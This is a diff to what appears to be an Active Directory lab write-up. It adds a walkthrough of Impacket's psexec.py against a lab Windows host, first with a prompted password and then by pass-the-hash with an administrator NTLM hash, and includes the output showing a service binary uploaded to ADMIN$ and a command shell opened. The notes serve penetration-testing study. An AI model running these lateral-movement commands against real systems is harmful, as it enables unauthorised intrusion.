@@ -172,5 +172,44 @@ nt authority\system
 
 We can use the `exit` command to close this section
 
-Sometimes we might not be able to pass our password as a string directly, we can just remove the password from our command and things would be fine
+Sometimes we might not be able to pass our password as a string directly, we can just remove the password from our command and things would be fine, as we can see we are prompted for a password below
 
+```shell
+sec-fortress@Pwn-F0rk-3X3C:~/PEH/AD$ psexec.py MARVEL/fcastle:@192.168.0.166  
+
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 192.168.0.166.....
+[*] Found writable share ADMIN$
+[*] Uploading file aDwPMykR.exe
+[*] Opening SVCManager on 192.168.0.166.....
+[*] Creating service JZWK on 192.168.0.166.....
+[*] Starting service JZWK.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19045.2006]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+We could also connect to our target with hashes
+
+```shell
+sec-fortress@Pwn-F0rk-3X3C:~/PEH/AD$ psexec.py administrator@192.168.0.166 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
+
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 192.168.0.166.....
+[*] Found writable share ADMIN$
+[*] Uploading file UaXfeiHM.exe
+[*] Opening SVCManager on 192.168.0.166.....
+[*] Creating service SCMQ on 192.168.0.166.....
+[*] Starting service SCMQ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19045.2006]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+
+```
